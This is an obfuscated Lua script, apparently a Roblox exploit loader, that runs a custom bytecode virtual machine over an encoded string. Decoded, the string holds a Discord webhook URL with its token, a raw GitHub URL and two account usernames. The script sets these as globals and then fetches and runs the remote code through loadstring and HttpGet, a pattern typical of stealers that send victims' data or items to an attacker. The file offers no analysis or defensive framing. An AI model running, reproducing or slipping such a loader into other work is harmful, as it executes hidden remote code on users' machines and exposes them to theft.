local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v88=v2(v0(v30,16));if v19 then local v108=v5(v88,v19);v19=nil;return v108;else return v88;end end end);local function v20(v31,v32,v33) if v33 then local v89=0;local v90;while true do if (v89==(0 -0)) then v90=(v31/((5 -(880 -(282 + 595)))^(v32-(1 -0))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-(932 -(857 + 74)))) + (569 -((2004 -(1523 + 114)) + 201)))) ;return v90-(v90%(928 -(214 + 713))) ;end end else local v91=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v91 + v91))>=v91) and 1) or (0 + 0) ;end end local function v21() local v34=0 -(0 -0) ;local v35;while true do if (v34==((1968 -903) -((124 -56) + 997))) then v35=v1(v16,v18,v18);v18=v18 + (1271 -((576 -(87 + 263)) + 1044)) ;v34=1 + 0 ;end if (v34==(958 -(892 + 65))) then return v35;end end end local function v22() local v36,v37=v1(v16,v18,v18 + 2 );v18=v18 + (182 -(67 + 113)) ;return (v37 * (188 + 68)) + v36 ;end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + (7 -4) );v18=v18 + 3 + 1 ;return (v41 * (66680831 -49903615)) + (v40 * (66488 -(802 + 150))) + (v39 * (689 -433)) + v38 ;end local function v24() local v42=(0 -0) -(0 -0) ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(3 + 0)) then if (v47==0) then if (v46==0) then return v48 * ((817 + 180) -((1774 -(814 + 45)) + 82)) ;else v47=2 -(2 -1) ;v45=0 + 0 + 0 ;end elseif (v47==(2691 -644)) then return ((v46==(0 + 0)) and (v48 * ((1188 -(1069 + (890 -(201 + 571))))/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(2237 -1214) ) * (v45 + (v46/((1 + 1)^52))) ;end if (v42==(1 -0)) then v45=1;v46=(v20(v44,1 + 0 ,811 -(368 + 423) ) * ((6 -4)^(50 -(10 + 8)))) + v43 ;v42=(1145 -(116 + 1022)) -(20 -15) ;end if (v42==((261 + 183) -(416 + 26))) then v47=v20(v44,66 -45 ,14 + (902 -(261 + 624)) );v48=((v20(v44,32)==1) and  -(1 -0)) or (439 -(145 + 293)) ;v42=433 -(44 + 386) ;end if (v42==(1486 -(998 + (866 -378)))) then v43=v23();v44=v23();v42=1 + 0 ;end end end local function v25(v49) local v50;if  not v49 then local v92=1080 -(1020 + 60) ;while true do if (v92==((561 + 862) -(630 + 793))) then v49=v23();if (v49==0) then return "";end break;end end end v50=v3(v16,v18,(v18 + v49) -(3 -2) );v18=v18 + v49 ;local v51={};for v67=4 -3 , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v52=(function() return function(v93,v94,v95,v96,v97,v98,v99,v100) local v93=(function() return 0;end)();local v94=(function() return;end)();local v96=(function() return;end)();while true do if (v93==0) then local v113=(function() return 0;end)();while true do if (v113==(698 -(208 + 490))) then v94=(function() return v95();end)();v96=(function() return nil;end)();v113=(function() return 1;end)();end if ((1 + 0)==v113) then v93=(function() return  #"{";end)();break;end end end if (v93== #"]") then if (v94== #",") then v96=(function() return v95()~=(0 + 0) ;end)();elseif (v94==2) then v96=(function() return v97();end)();elseif (v94~= #"xnx") then else v96=(function() return v98();end)();end v99[v100]=(function() return v96;end)();break;end end return v93,v94,v95,v96,v97,v98,v99,v100;end;end)();local v53=(function() return function(v101,v102,v103) local v104=(function() return 836 -(660 + 176) ;end)();local v105=(function() return;end)();while true do if ((0 + 0)==v104) then v105=(function() return 202 -(14 + 188) ;end)();while true do if (v105==0) then local v121=(function() return 0;end)();while true do if (v121==0) then v101[v102-#"/" ]=(function() return v103();end)();return v101,v102,v103;end end end end break;end end end;end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {v54,v55,nil,v56};end)();local v58=(function() return v23();end)();local v59=(function() return {};end)();for v69= #"|",v58 do FlatIdent_C460,Type,v21,Cons,v24,v25,v59,v69=(function() return v52(FlatIdent_C460,Type,v21,Cons,v24,v25,v59,v69);end)();end v57[ #"-19"]=(function() return v21();end)();for v70= #":",v23() do local v71=(function() return 0;end)();local v72=(function() return;end)();while true do if (v71~=(0 + 0)) then else v72=(function() return v21();end)();if (v20(v72, #" ", #"|")==(0 + 0)) then local v117=(function() return 0;end)();local v118=(function() return;end)();local v119=(function() return;end)();local v120=(function() return;end)();while true do if (v117==2) then if (v20(v119, #"!", #":")~= #"<") then else v120[2 + 0 ]=(function() return v59[v120[3 -1 ]];end)();end if (v20(v119,2,2 -0 )~= #":") then else v120[ #"19("]=(function() return v59[v120[ #"91("]];end)();end v117=(function() return 3;end)();end if (v117==(2 -1)) then local v122=(function() return 0;end)();while true do if (1==v122) then v117=(function() return 2 + 0 ;end)();break;end if (v122==0) then local v152=(function() return 0 + 0 ;end)();while true do if (v152~=(396 -(115 + 281))) then else v120=(function() return {v22(),v22(),nil,nil};end)();if (v118==(0 + 0)) then local v191=(function() return 0 -0 ;end)();local v192=(function() return;end)();while true do if (v191~=0) then else v192=(function() return 0;end)();while true do if (v192==(0 -0)) then v120[ #"xxx"]=(function() return v22();end)();v120[ #"asd1"]=(function() return v22();end)();break;end end break;end end elseif (v118== #"}") then v120[ #"nil"]=(function() return v23();end)();elseif (v118==2) then v120[ #"91("]=(function() return v23() -(2^16) ;end)();elseif (v118== #"xnx") then local v200=(function() return 867 -(550 + 317) ;end)();local v201=(function() return;end)();while true do if (v200==(0 -0)) then v201=(function() return 0;end)();while true do if (v201==(0 -0)) then v120[ #"-19"]=(function() return v23() -(2^16) ;end)();v120[ #"?id="]=(function() return v22();end)();break;end end break;end end end v152=(function() return 1;end)();end if (v152==1) then v122=(function() return 1;end)();break;end end end end end if ((0 -0)~=v117) then else local v123=(function() return 0;end)();while true do if (v123==1) then v117=(function() return 286 -(134 + 151) ;end)();break;end if (v123~=(1665 -(970 + 695))) then else v118=(function() return v20(v72,3 -1 , #"xxx");end)();v119=(function() return v20(v72, #"asd1",1996 -(582 + 1408) );end)();v123=(function() return 1;end)();end end end if (v117==3) then if (v20(v119, #"19(", #"19(")== #",") then v120[ #"http"]=(function() return v59[v120[ #"0313"]];end)();end v54[v70]=(function() return v120;end)();break;end end end break;end end end for v73= #">",v23() do v55,v73,v28=(function() return v53(v55,v73,v28);end)();end return v57;end local function v29(v61,v62,v63) local v64=v61[3 -2 ];local v65=v61[2 -(850 -(20 + 830)) ];local v66=v61[(9 + 2) -8 ];return function(...) local v74=v64;local v75=v65;local v76=v66;local v77=v27;local v78=1825 -(1195 + 629) ;local v79= -(1 -0);local v80={};local v81={...};local v82=v12("#",...) -(781 -(162 + 618)) ;local v83={};local v84={};for v106=0 + 0 ,v82 do if ((v106>=v76) or (1421>=2104)) then v80[v106-v76 ]=v81[v106 + 1 + 0 ];else v84[v106]=v81[v106 + (1 -(738 -(542 + 196))) ];end end local v85=(v82-v76) + (1 -0) ;local v86;local v87;while true do local v107=0 + 0 ;while true do if ((1637 -(1373 + 263))==v107) then if ((1812<=3249) and (v87<=(1005 -(451 + 549)))) then if (v87<=((1 -0) + 1)) then if (v87<=0) then local v129=0 -0 ;local v130;while true do if (v129==(0 -0)) then v130=v86[1386 -(218 + 528 + 638) ];v84[v130]=v84[v130](v13(v84,v130 + 1 + 0 ,v79));break;end end elseif (v87==(1 -0)) then v84[v86[(175 + 168) -(218 + 123) ]]();else v84[v86[1583 -(1535 + 46) ]]=v63[v86[3 + 0 ]];end elseif (v87<=(1 + 2)) then local v131;local v132,v133;local v134;local v135;v63[v86[3]]=v84[v86[562 -(306 + 254) ]];v78=v78 + 1 ;v86=v74[v78];v84[v86[2]]=v63[v86[1 + 0 + 2 ]];v78=v78 + (1 -0) ;v86=v74[v78];v84[v86[2]]=v63[v86[3]];v78=v78 + ((3868 -2400) -(899 + 568)) ;v86=v74[v78];v135=v86[(4 -2) + 0 ];v134=v84[v86[7 -4 ]];v84[v135 + (604 -(268 + (1886 -(1126 + 425)))) ]=v134;v84[v135]=v134[v86[294 -((465 -(118 + 287)) + 230) ]];v78=v78 + (573 -(426 + 146)) ;v86=v74[v78];v84[v86[1 + 1 ]]=v86[1459 -(282 + 1174) ];v78=v78 + (812 -(569 + 242)) ;v86=v74[v78];v84[v86[2]]=v86[8 -5 ]~=(0 + 0) ;v78=v78 + ((4017 -2992) -(706 + 318)) ;v86=v74[v78];v135=v86[2];v132,v133=v77(v84[v135](v13(v84,v135 + ((2373 -(118 + 1003)) -((2109 -1388) + 530)) ,v86[1274 -(945 + 326) ])));v79=(v133 + v135) -(2 -1) ;v131=0 + 0 ;for v153=v135,v79 do local v154=700 -(271 + (806 -(142 + 235))) ;while true do if (v154==(0 + 0)) then v131=v131 + 1 ;v84[v153]=v132[v131];break;end end end v78=v78 + (1501 -((6387 -4979) + 21 + 71)) ;v86=v74[v78];v135=v86[1088 -(461 + (1602 -(553 + 424))) ];v84[v135]=v84[v135](v13(v84,v135 + (1 -0) ,v79));v78=v78 + ((1136 + 153) -(993 + 295)) ;v86=v74[v78];v84[v86[1 + 1 ]]();v78=v78 + (1172 -(418 + 753)) ;v86=v74[v78];v78=v86[2 + 1 ];elseif ((1623<=1957) and (v87>(4 + 0))) then local v157=0 + 0 ;while true do if (v157==(1 + 0)) then v78=v78 + 1 ;v86=v74[v78];v63[v86[1 + 2 ]]=v84[v86[531 -(406 + 123) ]];v78=v78 + (1770 -(1749 + 20)) ;v157=1 + 1 ;end if (v157==(1324 -(1249 + 73))) then v86=v74[v78];v84[v86[1 + 1 ]]=v86[(669 + 479) -(466 + 679) ];v78=v78 + (2 -1) ;v86=v74[v78];v157=(4 + 4) -5 ;end if ((4412==4412) and (v157==(1903 -(106 + 1794)))) then v78=v86[1 + 2 ];break;end if ((1750>=842) and (v157==(0 + 0))) then v63[v86[8 -5 ]]=v84[v86[5 -3 ]];v78=v78 + (115 -(4 + 110)) ;v86=v74[v78];v84[v86[2]]=v86[587 -(57 + 527) ];v157=1428 -(41 + 1386) ;end end else v84[v86[105 -(17 + 86) ]]=v86[3]~=(0 + 0) ;end elseif (v87<=8) then if ((4372>1850) and (v87<=(13 -7))) then v78=v86[3];elseif ((232<821) and (v87==(20 -13))) then v63[v86[3]]=v84[v86[168 -(70 + 52 + 44) ]];elseif (v84[v86[2 -(0 -0) ]]==v86[12 -8 ]) then v78=v78 + 1 ;else v78=v86[3];end elseif ((518<902) and (v87<=(9 + 1))) then if (v87>9) then local v161=0 + (0 -0) ;local v162;local v163;local v164;local v165;while true do if (v161==1) then v79=(v164 + v162) -1 ;v165=0;v161=3 -(2 -1) ;end if ((2994>858) and (v161==(65 -(30 + 11 + 24)))) then v162=v86[2];v163,v164=v77(v84[v162](v13(v84,v162 + 1 + 0 ,v86[1260 -(1043 + 214) ])));v161=(14 -11) -2 ;end if (v161==(755 -(239 + 514))) then for v193=v162,v79 do v165=v165 + (1213 -(114 + 209 + 889)) ;v84[v193]=v163[v165];end break;end end else v84[v86[(1334 -(797 + 532)) -3 ]]=v86[3];end elseif ((v87>(591 -(263 + 98 + 219))) or (3755<=915)) then do return;end else local v168=v86[2];local v169=v84[v86[323 -(53 + 267) ]];v84[v168 + 1 + 0 + 0 ]=v169;v84[v168]=v169[v86[417 -(15 + 398) ]];end v78=v78 + (983 -(18 + 964)) ;break;end if (v107==(0 -0)) then v86=v74[v78];v87=v86[1 + 0 ];v107=1 + 0 ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0C3O00028O00026O00F03F03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3132383O323832372O32343732312O3031362F4762316F5142526247736E5471526F4944713770504738765930312O39745A54627758624677782D75666D4C5551426B3071375230372O4F6C386E365773725F4C316B38030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403403O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F646F736C6F626F6479646F6564792F782F6D61696E2F6D61696E2E6C756103083O00557365726E616D65030C3O005768697465686174736A696D03093O00557365726E616D6532030A3O004F6E6F64616B756E323300173O0012093O00013O0026083O000E000100020004063O000E0001001209000100043O001203000100033O00122O000100053O00122O000200063O00202O00020002000700122O000400086O000500016O000200056O00013O00024O00010001000100044O001600010026083O0001000100010004063O000100010012090001000A3O001205000100093O00122O0001000C3O00122O0001000B3O00124O00023O00044O000100012O000C3O00017O00",v9(),...);
